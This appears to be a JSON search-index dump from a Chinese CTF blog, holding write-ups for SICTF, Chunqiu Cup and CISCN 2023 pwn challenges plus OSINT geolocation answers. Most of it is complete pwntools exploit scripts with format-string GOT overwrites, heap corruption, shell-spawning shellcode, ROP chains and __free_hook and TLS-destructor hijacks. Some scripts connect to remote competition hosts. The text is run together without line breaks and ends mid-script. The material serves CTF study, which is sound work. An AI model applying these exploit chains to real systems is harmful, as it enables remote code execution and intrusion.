:io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('yuanshen.life',35259)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x002391continue'''.format(**locals())binary = './EeeeasyCpp'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def get_(name,pwd):    ru('&gt;&gt; ')    sl('G')    ru('Enter your name: ')    sl(name)    ru('Enter your password: ')    sl(pwd)ru(\"I'll give you a gift: \")x = int(io.recvline(),16)elf_base = x - 0x02650bd = elf_base + 0x22E0target = elf_base + elf.got['strlen']ls(hex(elf_base))t1 = elf_base + 19784ls(hex(t1))get_('a1',b'\\x00'*0x18+p64(0x21)+p64(t1)+p64(target))get_(p64(bd),'1')io.interactive()‍‍(🩸)Bug_Zapperfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './bugzapper'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())#for i in range(0x11):for i in range(0xb,0x11):    io = remote('yuanshen.life',34331)    sc = '''    xchg eax,esi    mov edx,esi    syscall    '''    sc = asm(sc)    #gdb.attach(io,'b *0x401092')    pay = sc    #io.interactive()    ru('&gt;&gt;&gt;')    s(pay+b'1'*i)    pause()    pay = b'\\x90'*0x10    pay += asm(shellcraft.sh())    sl(pay)    io.interactive()‍‍​​‍‍(🩸)Easy_SI‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)io = remote('yuanshen.life',33150)#pay = 'AAAAAAAA' + '%p%p%p%p%p%p'pay = '%p' * 0x30#0x401277 # stack_leak#0x400000 # elf_baselibc = ELF('./libc.so.6')print(''' # gcc -no-pie  # a.out[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c80e50 (puts) ◂— endbr64[0x404020] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64[0x404028] printf@GLIBC_2.2.5 -&gt; 0x7ffff7c606f0 (printf) ◂— endbr64[0x404030] read@GLIBC_2.2.5 -&gt; 0x7ffff7d147d0 (read) ◂— endbr64''')pay  = b'%7$sAAAA'pay += p64(0x404018) # putsru('Welcome to SICTF and Do you like pwn?')ru(\"And now let's start the game!!!\\n\")s(pay)x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']lss('x')lss('libc_base')printf_got = 0x404018+0x18 # test offset printfpay = fmtstr_payload(6,{printf_got:system})ru(\"And now let's start the game!!!\\n\")s(pay)io.interactive()‍‍‍Forensice‍OSINT签到1.直接百度识图发现一样的地方，双击进去发现是红城湖公园​​​​‍树木的压迫‍1.百度搜图定位到达州凤凰山，放大图片很明显可以看出是一个体育场​​​​2.百度地图直接搜索达州体育就能冒出来达州市体育中心​​  查看相册确定就是这个地方SICTF{四川省_达州市_通川区_凤凰大道376号_达州市体育中心}‍‍真的签到‍  百度搜图和谷歌搜图都搜不到，使用抖音识图，发现第一个视频就是后面的摩天轮和商场的外观极度相似​​  现在需要确定是那个城市点开这个视频发现评论区的IP全部都是广东的​​3.根据作者的留言井岸大信摩天轮尝试搜索定位到海珠之星摩天轮并且就在大信新都汇旁边​​​​  SICTF{广东省_珠海市_斗门区_大信新都汇}​​‍这才是签到‍  谷歌识图可知国家是在意大利威尼斯​​  使用意大利威尼斯达涅利酒店谷歌地图搜索发现拍摄地点应该为Gondola Danieli​​  根据聊天记录可知，你再走过小道就找到我了得到最后的结果为 ChiesadiSanZaccaria最后的结果就是SICTF{意大利_威尼斯_GondolaDanieli_ChiesadiSanZaccaria}​​‍签退‍1.谷歌识图发现有一个B站的视频点进去看看发现红绿灯和图片上的一模一样并且视频中也有很多那种白色且窗户很多的大楼暂且定位为南非开普敦​​​​2.观察图片发现有一个类似于蜘蛛网的东西，并且马赛克还有红色的部分，可以联想到蜘蛛侠​​  搜索 cape town spider man第一个链接发现一个视频在视频中发现了一样的红绿灯和大楼并且发现一个店铺的名称 STEERS 和给的图片中的店铺后面几个字母一样​​​​  谷歌地图搜索开普敦 STEERS几个店铺一个一个看最终确定到这里最终的flag为 SICTF{南非_开普敦_StrandSt_STEERS}​​​​"
  },
  
  {
    "title": "2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps",
    "url": "/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "‍  2023年春秋杯网络安全联赛冬季赛 ​pwn 方向 HouseofSome​ , 题解‍​​‍程序保护和沙箱​​​​‍菜单功能 泄露libc上的地址  ​scannf(\"%ldd\",&amp;xx)​ 传入 -​ 后面报错 会给出 libc上的地址​​​‍draw功能 任意地址写一个NULL 字节  通过上面泄露的_IO_2_1_stdin_​地址，我就基本上可以利用 draw​ 功能...",
    "content": "‍  2023年春秋杯网络安全联赛冬季赛 ​pwn 方向 HouseofSome​ , 题解‍​​‍程序保护和沙箱​​​​‍菜单功能 泄露libc上的地址  ​scannf(\"%ldd\",&amp;xx)​ 传入 -​ 后面报错 会给出 libc上的地址​​​‍draw功能 任意地址写一个NULL 字节  通过上面泄露的_IO_2_1_stdin_​地址，我就基本上可以利用 draw​ 功能在 libc可写的地方写入一个NULL字节，写到哪里呢？？‍  写 到 main_arena + 1 (add 一个堆块 保证 top_chunk 的低地址是 0x00)  需要爆破一点 保证 heap 地址起始是 heap_base &amp; 0xFFFF == 0x0000​​ ,然后攻击 main_arena+1​​ 的 位置 写 0x00 (利用 draw任意地址写 one null 字节， )      这样的话 top_chunk​ 就会指定 heap 的起始位置 也就是 tcachebins​ 结构体，下一次申请堆块的时候就可以 控制 tcachebins​ 结构体了，从而达到任意地址申请    攻击成功后 main_arena 地址就指向了 heap_base ， 也就是 修改了 top_chunk 的起始地址，申请的时候就会申请到 tcachebins 结构体上.控制 tcachebins 结构体  攻击 tcache结构体 ,控制链表数量和申请的地址​​任意读，任意写      首先利用 _IO_2_1_stdout_​ 泄露 environ​ 也就是栈地址        有了 stack地址 下一步就是利用 _IO_2_1_stdin_​ 任意地址写入， 在read 返回地址写 ORW_ROP  p *(struct _IO_FILE_plus *) &amp;_IO_2_1_stdout_p *(struct _IO_FILE_plus *) &amp;_IO_2_1_stdin_  攻击 _IO_2_1_stdout_​, _IO_2_1_stdin_​,fake_IO_FILE#  攻击 _IO_2_1_stdout_ 任意地址内容泄露environ = libc.sym['environ']pay = p64(0xFBAD1800) + p64(0) * 3 + p64(environ) + p64(environ+8)add(0x240,pay) stack = uu64(ru('1. ')) - 2408 + 0x18 # read 的返回地址lss('stack')#  攻击 _IO_2_1_stdin_ 任意地址写入内容pay = p64(0xfbad1800) + p64(0) * 6 + p64(stack) + p64(stack + 0x400)add(0x350,pay) 最后的利用脚本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './houseofsome'libelf = './libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x000163Abrva 0x000001875brva 0x1804#continue'''.format(**locals())for i in range(100):    #io = process(binary)    #io = process('./test/houseofsome')    io = remote('39.106.48.123', 33789)    def add(size,name,i=1):        ru('&gt; ')        sl((i-1)*'0' + '1')        ru('size&gt; ')        sl(str(size))        ru('name&gt; ')        sl(name)    def x_dev(dev):        ru('&gt; ')        sl('2')        ru('dev&gt; ')        sl(str(dev))    def draw(offset,l):        ru('&gt; ')        sl('3')        ru('offset&gt; ')        sl(str(offset))        ru('length&gt; ')        sl(str(l))    def show():        ru('&gt; ')        sl('4')    sl('-') ##    ru('invalid option ')    x = int(ru('.\\n'))    libc_base = x - 2095008 - 0x21000    lss('libc_base')    pay = p64(libc_base) * 0x40    libc = ELF('./libc.so.6')    libc.address = libc_base    read            = libc.sym['read']    setcontext      = libc.sym['setcontext']    _IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']    _IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']     _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']     _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']    _IO_list_all =   libc.sym['_IO_list_all']    environ =   libc.sym['environ']       #pay  = p64(0) * 14    #pay += p64(0x414243) + p64(0x0000000100000000)    #pay = pay.ljust(0x100,b'\\x00')    ##pay += p64(0) * (64)    ##pay += p64(0x414243) + p64(0x0000000100000000)    ##pay = pay.ljust(0x2f0,b'\\x00')    #pay = pay * 0x20    #add(0x2000,pay)    #add(0x2000,pay)    #    add(0x380,'1234')    x_dev(2)#    target = libc_base + 2092288+0x21000 + 1# main_arena    #target = read    offset = target - 0x114514000    lss('libc_base')    lss('target')    lss('offset')    lss('_IO_2_1_stdout_')    #gdb.attach(io)    #    #add(0x3a0,b'\\x00'*(0x380-0x88)+p64(0x20031)+b'\\x00'*0x28+p64(0x20001))    #gdb.attach(io,gdbscript)    #gdb.attach(io)    draw(offset,1)    try:        #pay = flat({        #    0x00: 0,        #    0x46: 0x010001,        #    0x198: 0x114514000,        #    0x1a0:_IO_2_1_stdout_        #},filler=b\"\\x00\")        #pay = flat({        #    0x00: 0,        #    0x46: 0x010001,        #    0x198:_IO_2_1_stdout_+0x68,        #    0x1a0: 0x114514010        #},filler=b\"\\x00\")        pay = flat({            0x00: 0,            0x46: 0x01,            0x68: 0x01,            0x198:_IO_2_1_stdout_,            0x220:_IO_2_1_stdin_        },filler=b\"\\x00\")        # tcachebins        # 0x250 [  1]: 0x7ff31e1ff808 (_IO_2_1_stdout_+104) ◂— 0x7ff4e12e0b3f        # 0x360 [  1]: 0x114514010 ◂— 0x114514        # 0x390 [  0]: 0x51        add(0x230,pay)        sl('00')        ru('&gt; ')        lss('libc_base')        lss('target')        lss('offset')        lss('_IO_2_1_stdout_')        environ = libc.sym['environ']        pay = p64(0xFBAD1800) + p64(0) * 3 + p64(environ) + p64(environ+8)        add(0x240,pay) #  攻击 _IO_2_1_stdout_ 任意地址内容泄露        stack = uu64(ru('1. ')) - 2408 + 0x18        lss('stack')        pay = p64(0xfbad1800) + p64(0) * 6 + p64(stack) + p64(stack + 0x400)        #gdb.attach(io)        add(0x350,pay) #  攻击 _IO_2_1_stdin_ 任意地址写入内容        #栈上 ORW_ROP        pause()        ## ORW_ROP        libc_rop = ROP(libc)        rax = libc_rop.find_gadget(['pop rax','ret'])[0]        rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]        rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]        #rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]        rdx = libc_base + 0x0000000000096272 #pop rdx ; or al, 0 ; ret        #rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]        syscall = libc_rop.find_gadget(['syscall','ret'])[0]        orw_rop_addr = stack        orw_rop  = p64(rdx) + p64(0) + p64(rax) + p64(2) + p64(rdi) + p64(orw_rop_addr+0xb8) + p64(rsi) + p64(0) +  p64(syscall)        orw_rop += p64(rdx) + p64(0x100) + p64(rdi) + p64(4) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(libc.sym['read'])        orw_rop += p64(rdx) + p64(0x100) + p64(rdi) + p64(1) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(libc.sym['write'])        orw_rop += b'/flag'.ljust(0x10,b'\\x00')        sl(orw_rop)        io.interactive()    except:        io.close()        continue‍​​‍‍‍参考出题人博客的houseofsomehttps://blog.csome.cc/p/house-of-some/#FSOP%EF%BC%81​​"
  },
  
  {
    "title": "Announcements",
    "url": "/posts/Announcements/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "评论区  🍎  有什么想说的？",
    "content": "评论区  🍎  有什么想说的？"
  },
  
  {
    "title": "CISCN 2023 华东北赛区 AWDPlus pwn 题复现",
    "url": "/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-23 00:00:00 +0800",
    





    
    "snippet": "‍  第十六届全国大学生信息安全竞赛—创新实践能力赛 华东北赛区‍‍‍minidb程序分析      heap pwn 第一步 写菜单        类似一个数据库， 可以，添加数据库，删除数据库，show 数据库…..  ​​‍  use_db() 里面还有一些操作​​  漏洞点在 use_db 里的 edit 功能里  18行 行可以输入 255 个字符串  19行测长度，21 虽然有长...",
    "content": "‍  第十六届全国大学生信息安全竞赛—创新实践能力赛 华东北赛区‍‍‍minidb程序分析      heap pwn 第一步 写菜单        类似一个数据库， 可以，添加数据库，删除数据库，show 数据库…..  ​​‍  use_db() 里面还有一些操作​​  漏洞点在 use_db 里的 edit 功能里  18行 行可以输入 255 个字符串  19行测长度，21 虽然有长度限制防止堆溢出  但是 在 20行  就已经使用 到 输入字符串的长度了，heap_addr + len + 0x10 = 0  如果堆块的大小是 0xa0, 而输入的是 0x100 ，这样的话很明显  可以将下面一个堆块的size 或内容 1字节清空，​​  比如修改 fd​​  漏洞找到了，后面就是堆风水了‍  libc 2.31 劫持 __free_hook​ 为 system​​​​​Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = 'minidb'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())io = start(binary)def add_db(name,Type):    ru('Your choice: ')    sl('1')    ru('Please input the name of database: ')    sl(name)    ru(\"Please input the type of database: \")    sl(str(Type))def use_db(name):    ru('Your choice: ')    sl('2')    ru(\"Please input the name of database: \")    sl(name)def del_db(name):    ru('Your choice: ')    sl('3')    ru('Please input the name of database: ')    sl(name)def show_db():    ru('Your choice: ')    sl('4')def rename_db(name,new_name):    ru('Your choice: ')    sl('5')    ru(\"Please input the name of database: \")    sl(name)    ru(\"Please input the new name for database: \")    sl(new_name)def use_db_add(idx,data):    ru('Your choice: ')    sl('1')    ru('Input the key: ')    sl(str(idx))    ru('Input the value:')    sl(data)def use_db_show(idx):    ru('Your choice: ')    sl('2')    ru('Input the key: ')    sl(str(idx))def use_db_edit(idx,data):    ru('Your choice: ')    sl('3')    ru('Input the key: ')    sl(str(idx))    ru('Input the new value: ')    sl(data)def use_db_rm(idx):    ru('Your choice: ')    sl('4')    ru('Input the key: ')    sl(str(idx))def use_db_exit():    ru('Your choice: ')    sl('666')add_db('N'*0xa7,1)use_db('N'*0xa7)use_db_add(0,'A'*8)use_db_add(1,'B'*8)use_db_add(2,'C'*8)use_db_add(3,'D'*0x78+'\\xa1')use_db_rm(2)use_db_rm(1)use_db_edit(0,'T'*0x90)use_db_add(2,'X')use_db_add(0xa1,'Y')use_db_rm(3)use_db_rm(2)use_db_edit(0,'T'*0x78+'\\xa1')use_db_show(0xa1)ru(' is ')heap_addr = uu64(r(6))use_db_exit()add_db('text1',1)add_db('text2',1)add_db('text3',1)add_db('/bin/sh',1)del_db('text2')target = heap_addr + 144target1 = heap_addr + 2272use_db('N'*0xa7)use_db_edit(0xa1,p64(target))##use_db_add(10,'test1')use_db_add(0x21,b'A'*8+p64(target1)) # leak main_arenause_db_exit()show_db()ru('N\\n\\x09')main_arena = uu64(r(6))libc_base = main_arena - 2018272libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']use_db('N'*0xa7)use_db_edit(0x21,b'A' *0x18+ p16(0x801))use_db_edit(0x21,b'A' *9+ p64(target1))use_db_edit(0x21,b'A' *8+ p64(target1))use_db_exit()use_db('/bin/sh')use_db_add(0,'A'*8)use_db_add(1,'B'*8)use_db_add(2,'C'*8)use_db_add(3,'D'*8)use_db_rm(2)use_db_rm(1)use_db_edit(0,'T'*0x90)use_db_add(10,'D'*0x18+'\\xa1')use_db_add(11,'D'*8)use_db_rm(3)use_db_rm(11)use_db_edit(10, b'T'*0x20+p64(__free_hook-0x10))use_db_add(21,'tt')use_db_add(22,p64(system))use_db_exit()lss('libc_base')lss('heap_addr')#gdb.attach(io,'brva 0x002340')del_db('/bin/sh')io.interactive()Fix  修复应该很简单直接这个 nop 掉 应该就没问题了​​‍  修复​​‍‍‍‍‍dbgnote  envp 知识点 LD_DEBUG=files​ LD_DEBUG=all​ 环境变量里有这些，运行时会有调试信息  劫持 tls 段 控制 exit​​ -&gt; __run_exit_handlers​​ -&gt; __call_tls_dtors​​ 里面的走向程序分析  main 函数处 buf 存在 一个bss 上的溢出，可以覆盖 下面的指针​​‍  四功能齐全，但是没有任何问题，此题可能不是打堆​​‍  gift 功能 泄露栈地址，具体什么用后面就知道了​​  dbg 模式​​‍  初始化函数，存在一个 可以触发 dbg 模式的 信号 6​​‍Break‍  程序基本就是上面那样，我也是跟着其他大佬的wp 做的，我们直接讲一下关键点‍  想要触发 dbg 模式 我们就需要 程序发出SIGABRT 6 ,  SIGABRT 6 的触发也就是由abort(3)发出的退出指令  什么可以触发abort(3) 呢？，没错 就是栈溢出。  SIGABRT 6 C 由abort(3)发出的退出指令‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x01500'''.format(**locals())binary = './dbgnote'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary,['run'])#io = remote()nl = ['Note_Add','Note_Delete','Note_Write','Note_Read',b'++--++--']def login(name):    ru('UserName: ')    sl(name)def add(size,text):    ru('@Note $ ')    sl(nl[0])    ru('Size: ')    sl(str(size))    ru(\"Note: \")    s(text)def rm(idx):    ru('@Note $ ')    sl(nl[1])    ru(\"Index: \")    sl(str(idx))def edit(idx,text):    ru('@Note $ ')    sl(nl[2])    ru(\"Index: \")    sl(str(idx))    ru(\"Note: \")    sl(text)def show(idx):    ru('@Note $ ')    sl(nl[3])    ru(\"Index: \")    sl(str(idx))def gift(e=b'\\x00'):    ru('@Note $ ')    sl(nl[4]+e)login('my_name\\x00')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)  进入 __stack_chk_fail​ 就会调用 abort(3)​​​​​‍继续执行的话，直接就可以触发 dbg 模式​​​​  进入dbg 模式了​‍  虽然进入dbg 模式了，但是 由于程序有 PIE ，想利用任意读任意写功能都是梦，  所以该这么泄露地址呢？这就需要利用 环境变量了，下图里的envp 指针是可以通过buf 溢出修改的​​‍  测试代码login('my_name\\x00')ru('@Note $ ')sl('A' * 0x32)ru('@Note $ ')sl(nl[0])ru('Size: ')gdb.attach(io)s('A'*0x19)​​  也就是说可以控制 envp 的指针，具体指向哪呢，怎么利用呢？继续看​‍  有个东西叫 LD_DEBUG​ ,  只要环境变量里有 LD_DEBUG=files​ 就可以在执行程序的时候 输出下面的那一坨东西 debug信息​​  ​LD_DEBUG​ help​​‍‍  利用 gift 泄露 stack 低16 位 ，泄露的地址 + 0x1c​ 也就是 我们 name 的低 16 位，可以把 envp 的低 16 位改成 name 的地址，这样我们的 envp 的内容就可以通过 name 来控制​​  然后继续运行就会 有这一坨调试数据  接受 libc_baselogin('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)ru('[Addr] ')libc = elf.libc# _GLOBAL_OFFSET_TABLE_gdb.attach(io)lss('libc_base')‍  最后是 exit(0) 退出，打 IO 的话 0x90 应该不够用. pass  由于是高版本。传统的 exit_hook 打 _rtld_global​ 不可用. pass  高版本下可以利用 劫持 tls 段内容 来控制 __call_tls_dtors​ ，​exit​ -&gt; __run_exit_handlers​ -&gt; __call_tls_dtors​‍​​‍  通过这个地址 泄露 ld 上的地址​​​​‍泄露 ld 地址 计算 tlslogin('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)libc = elf.libcld_addr = libc_base + 2203664lss('libc_base')lss('ld_addr')ru('[Addr] ')s(p64(ld_addr))ru('[Read] ')ld = uu64(r(6))ld_base = ld - 89392tls_base = ld_base - 100544gdb.attach(io)lss('libc_base')lss('ld_addr')lss('ld_base')lss('tls_base')​​‍  差不多了，然后 执行到 __call_tls_dtors​ 根据 情况取调试 就可以了‍​​// glibc 2.35__call_tls_dtors (void){  while (tls_dtor_list)    {      struct dtor_list *cur = tls_dtor_list;      dtor_func func = cur-&gt;func;#ifdef PTR_DEMANGLE      PTR_DEMANGLE (func);#endif      tls_dtor_list = tls_dtor_list-&gt;next;      func (cur-&gt;obj); // call rax      /* Ensure that the MAP dereference happens before\t l_tls_dtor_count decrement.  That way, we protect this access from a\t potential DSO unload in _dl_close_worker, which happens when\t l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */      atomic_fetch_add_release (&amp;cur-&gt;map-&gt;l_tls_dtor_count, -1);      free (cur);    }}libc_hidden_def (__call_tls_dtors)​​  exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x01500'''.format(**locals())binary = './dbgnote'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary,['run'])#io = remote()nl = ['Note_Add','Note_Delete','Note_Write','Note_Read',b'++--++--']def login(name):    ru('UserName: ')    sl(name)def add(size,text):    ru('@Note $ ')    sl(nl[0])    ru('Size: ')    sl(str(size))    ru(\"Note: \")    s(text)def rm(idx):    ru('@Note $ ')    sl(nl[1])    ru(\"Index: \")    sl(str(idx))def edit(idx,text):    ru('@Note $ ')    sl(nl[2])    ru(\"Index: \")    sl(str(idx))    ru(\"Note: \")    sl(text)def show(idx):    ru('@Note $ ')    sl(nl[3])    ru(\"Index: \")    sl(str(idx))def gift(e=b'\\x00'):    ru('@Note $ ')    sl(nl[4]+e)login('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)libc = elf.libcld_addr = libc_base + 2203664lss('libc_base')lss('ld_addr')ru('[Addr] ')s(p64(ld_addr))ru('[Read] ')ld = uu64(r(6))ld_base = ld - 89392tls_base = ld_base - 100544#gdb.attach(io)lss('libc_base')lss('ld_addr')lss('ld_base')lss('tls_base')def ror(num,i):    part1 = num &gt;&gt; i    part2 = num &lt;&lt; (64 - i)    part2 &amp;= (1 &lt;&lt; 64) -1    return part1 + part2ru('[Addr] ')target = tls_base - 88#mov    rbp, qword ptr fs:[rbx]#RBX  0xffffffffffffffa8 = - 88s(p64(target))libc = elf.libcsystem = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))t1 = ror(target,0x11)t2 = t1 ^ systemru('[Write] ')pay = p64(target) + p64(bin_sh) + p64(target)pay = pay.ljust(88,b'A')pay = pay + 0x10 * b'\\x00'pay = pay + p64(tls_base) + p64(0) #  需要一个地址pay = pay + 0x10 * b'\\x00'pay += p64(t2) # 0x90s(pay)io.interactive()​​‍Fix  把几处溢出的地方修复应该就没问题了‍‍​​‍​​‍‍cgi‍程序分析‍      模拟 cgi , libc 2.31 的堆题，分析菜单要我的命啊        UAF 漏洞, 利用就比较简单了  ‍break​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         